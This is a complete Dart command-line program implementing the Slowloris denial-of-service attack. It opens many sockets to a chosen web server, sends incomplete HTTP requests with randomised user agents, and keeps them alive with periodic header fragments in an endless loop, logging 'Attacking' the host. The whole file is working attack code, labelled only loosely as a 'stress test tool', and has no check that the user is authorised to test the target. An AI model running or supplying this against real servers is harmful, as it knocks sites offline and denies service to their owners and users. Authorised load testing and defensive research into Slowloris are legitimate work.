import 'dart:io';
import 'dart:math';
import 'package:args/args.dart';

// User agents list for randomization
final List<String> userAgents = [
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
  'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0',
];

class SlowlorisConfig {
  final String host;
  final int port;
  final int sockets;
  final bool verbose;
  final bool randUserAgent;
  final int sleepTime;

  SlowlorisConfig({
    required this.host,
    this.port = 80,
    this.sockets = 150,
    this.verbose = false,
    this.randUserAgent = false,
    this.sleepTime = 15,
  });
}

class Slowloris {
  final SlowlorisConfig config;
  final List<Socket> listOfSockets = [];
  final Random random = Random();

  Slowloris(this.config);

  void log(String message, {bool isDebug = false}) {
    if (isDebug && !config.verbose) return;
    final now = DateTime.now();
    final timestamp =
        '${now.day.toString().padLeft(2, '0')}-${now.month.toString().padLeft(2, '0')}-${now.year} ${now.hour.toString().padLeft(2, '0')}:${now.minute.toString().padLeft(2, '0')}:${now.second.toString().padLeft(2, '0')}';
    print('[$timestamp] $message');
  }

  Future<Socket?> initSocket(String ip) async {
    try {
      final socket = await Socket.connect(
        ip,
        config.port,
        timeout: Duration(seconds: 4),
      );

      await sendLine(socket, 'GET /?${random.nextInt(2000)} HTTP/1.1');

      String ua = userAgents[0];
      if (config.randUserAgent) {
        ua = userAgents[random.nextInt(userAgents.length)];
      }

      await sendHeader(socket, 'User-Agent', ua);
      await sendHeader(socket, 'Accept-language', 'en-US,en,q=0.5');

      return socket;
    } catch (e) {
      log('Failed to create socket: $e', isDebug: true);
      return null;
    }
  }

  Future<void> sendLine(Socket socket, String line) async {
    try {
      socket.write('$line\r\n');
      await socket.flush();
    } catch (e) {
      log('Error sending line: $e', isDebug: true);
    }
  }

  Future<void> sendHeader(Socket socket, String name, String value) async {
    await sendLine(socket, '$name: $value');
  }

  Future<void> slowlorisIteration() async {
    log('Sending keep-alive headers...');
    log('Socket count: ${listOfSockets.length}');

    // Try to send a header line to each socket
    final socketsToRemove = <Socket>[];
    for (final socket in listOfSockets) {
      try {
        await sendHeader(socket, 'X-a', random.nextInt(5000).toString());
      } catch (e) {
        socketsToRemove.add(socket);
      }
    }

    // Remove failed sockets
    for (final socket in socketsToRemove) {
      listOfSockets.remove(socket);
      try {
        socket.destroy();
      } catch (_) {}
    }

    // Create new sockets to replace the failed ones
    final diff = config.sockets - listOfSockets.length;
    if (diff <= 0) return;

    log('Creating $diff new sockets...');
    for (var i = 0; i < diff; i++) {
      try {
        final socket = await initSocket(config.host);
        if (socket != null) {
          listOfSockets.add(socket);
        }
      } catch (e) {
        log('Failed to create new socket: $e', isDebug: true);
        break;
      }
    }
  }

  Future<void> run() async {
    log('Attacking ${config.host} with ${config.sockets} sockets.');

    log('Creating sockets...');
    for (var i = 0; i < config.sockets; i++) {
      try {
        log('Creating socket nr $i', isDebug: true);
        final socket = await initSocket(config.host);
        if (socket != null) {
          listOfSockets.add(socket);
        }
      } catch (e) {
        log('Error: $e', isDebug: true);
        break;
      }
    }

    while (true) {
      try {
        await slowlorisIteration();
      } catch (e) {
        log('Error in Slowloris iteration: $e', isDebug: true);
      }
      log('Sleeping for ${config.sleepTime} seconds', isDebug: true);
      await Future.delayed(Duration(seconds: config.sleepTime));
    }
  }

  void cleanup() {
    for (final socket in listOfSockets) {
      try {
        socket.destroy();
      } catch (_) {}
    }
    listOfSockets.clear();
  }
}

void main(List<String> arguments) async {
  final parser = ArgParser()
    ..addOption('port',
        abbr: 'p',
        defaultsTo: '80',
        help: 'Port of webserver, usually 80')
    ..addOption('sockets',
        abbr: 's',
        defaultsTo: '150',
        help: 'Number of sockets to use in the test')
    ..addFlag('verbose',
        abbr: 'v',
        defaultsTo: false,
        help: 'Increases logging')
    ..addFlag('randuseragents',
        abbr: 'u',
        defaultsTo: false,
        help: 'Randomizes user-agents with each request')
    ..addOption('sleeptime',
        defaultsTo: '15',
        help: 'Time to sleep between each header sent.')
    ..addFlag('help',
        abbr: 'h',
        defaultsTo: false,
        negatable: false,
        help: 'Show this help message');

  ArgResults argResults;
  try {
    argResults = parser.parse(arguments);
  } catch (e) {
    print('Error parsing arguments: $e\n');
    print('Slowloris, low bandwidth stress test tool for websites\n');
    print('Usage: slowloris <host> [options]\n');
    print(parser.usage);
    exit(1);
  }

  if (argResults['help'] == true || argResults.rest.isEmpty) {
    print('Slowloris, low bandwidth stress test tool for websites\n');
    print('Usage: slowloris <host> [options]\n');
    print(parser.usage);
    exit(argResults.rest.isEmpty ? 1 : 0);
  }

  final host = argResults.rest[0];
  final config = SlowlorisConfig(
    host: host,
    port: int.parse(argResults['port'] as String),
    sockets: int.parse(argResults['sockets'] as String),
    verbose: argResults['verbose'] as bool,
    randUserAgent: argResults['randuseragents'] as bool,
    sleepTime: int.parse(argResults['sleeptime'] as String),
  );

  final slowloris = Slowloris(config);

  // Handle Ctrl+C gracefully
  ProcessSignal.sigint.watch().listen((_) {
    print('\nStopping Slowloris');
    slowloris.cleanup();
    exit(0);
  });

  try {
    await slowloris.run();
  } catch (e) {
    print('Error: $e');
    slowloris.cleanup();
    exit(1);
  }
}
